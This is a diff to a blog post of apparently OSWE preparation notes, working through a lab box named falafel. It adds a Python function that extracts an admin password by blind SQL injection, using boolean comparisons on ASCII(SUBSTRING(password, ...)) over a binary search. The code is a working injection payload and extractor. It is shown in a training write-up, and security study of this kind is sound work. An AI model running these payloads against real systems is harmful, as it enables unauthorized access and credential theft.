@@ -85,7 +85,8 @@ Prepared statemets allow to change body after creating a request, but HTTP-heade
 
 
 Final piece of code to send URL-decoded body:
-```
+
+```python
 ...
   sql_string = "admin'+and+ASCII(SUBSTRING(password,{},1))={}--+-".format(indx, chr_)
   data = {'username': sql_string, 'password':'pass'}
@@ -100,11 +101,45 @@ Final piece of code to send URL-decoded body:
 ...
 ```
 
-It's better to binary search instead of n(1), but im lazy. Here is proof of dupmping all tables:
+It's better to binary search instead of O(N), but im lazy. Here is proof of dupmping all tables:
 
 {% include figure.html path="assets/img/posts/oswe_preparation/falafel_sqli_tables.png" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}
 
-And link to my [script](https://github.com/MikeDakotaStayTrue/Script4You/blob/main/blind_sqli_extractor.py).
+UPD, added function for binary search О(logN) - maybe will use it as basement for future tasks:
+
+```python
+def binary_extract_passwords():
+    password = ""
+
+    for indx in range(1, 40):
+        left = 47
+        right = 123
+
+        while left <= right:
+            cursor = left + (right - left) // 2
+
+            # Check cursor (middle)
+            sql_string = "admin'+and+ASCII(SUBSTRING(password,{},1))={}--+-".format(indx, cursor)
+            resp = send_request(sql_string)
+
+            if "Wrong identification" in resp.text:
+                password = password + chr(cursor)
+                break
+
+            # Сheck sides
+            sql_string = "admin'+and+ASCII(SUBSTRING(password,{},1))>{}--+-".format(indx, cursor)
+            resp = send_request(sql_string)
+
+            if "Wrong identification" in resp.text:
+                left = cursor + 1
+            else:
+                right = cursor - 1
+    print(password)
+```
+
+And [link](https://github.com/MikeDakotaStayTrue/Script4You/blob/main/blind_sqli_extractor.py) to my script.
 
 {% include figure.html path="assets/img/posts/oswe_preparation/falafel_sqli_pass.png" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}
+
+
 ---
